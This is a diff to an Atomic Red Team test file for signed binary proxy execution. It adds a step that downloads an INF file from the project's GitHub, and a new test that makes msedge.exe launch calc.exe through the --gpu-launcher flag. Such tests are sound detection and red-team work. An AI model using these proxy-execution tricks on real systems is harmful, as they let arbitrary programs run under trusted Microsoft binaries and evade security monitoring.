@@ -313,6 +313,15 @@ atomic_tests:
       description: Path to ie4uinit.exe
       type: path
       default: c:\windows\system32\ie4uinit.exe
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      ieuinit.inf must exist on disk at specified location (#{Path_inf})
+    prereq_command: |
+      if (Test-Path "#{Path_inf}") {exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -Type Directory (split-path "#{Path_inf}") -ErrorAction ignore | Out-Null
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/ieuinit.inf" -OutFile "#{Path_inf}"
   executor:
     command: |
       copy #{Path_ie4uinit} %TEMP%\ie4uinit.exe
@@ -365,3 +374,30 @@ atomic_tests:
       reg add HKLM\SOFTWARE\Microsoft\Provisioning\Commands\LOLBin\dummy1\dummy2 /v Commandline /d calc.exe
       c:\windows\system32\provlaunch.exe LOLBin
     name: command_prompt
+- name: LOLBAS Msedge to Spawn Process
+  auto_generated_guid: e5eedaed-ad42-4c1e-8783-19529738a349
+  description: |
+    Executes a process under a trusted Microsoft signed binary,mseddge. This test will spawn "calc.exe" as a child process of msedge.exe
+    - https://lolbas-project.github.io/lolbas/Binaries/Msedge/
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      $edgePath64 = "C:\Program Files\Microsoft\Edge\Application\msedge.exe"
+      if (Test-Path $edgePath64) {
+          $edgePath = $edgePath64
+      } else {
+          # Check 32-bit Edge installation path
+          $edgePath32 = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
+          if (Test-Path $edgePath32) {
+              $edgePath = $edgePath32
+          } else {
+              exit 1
+          }
+      }
+      & $edgePath --disable-gpu-sandbox --gpu-launcher="C:\\Windows\\System32\\calc.exe &&"
+      sleep 5
+      taskkill -f -im msedge.exe
+      taskkill -f -im calc.exe
+      taskkill -f -im win32calc.exe
+    name: powershell
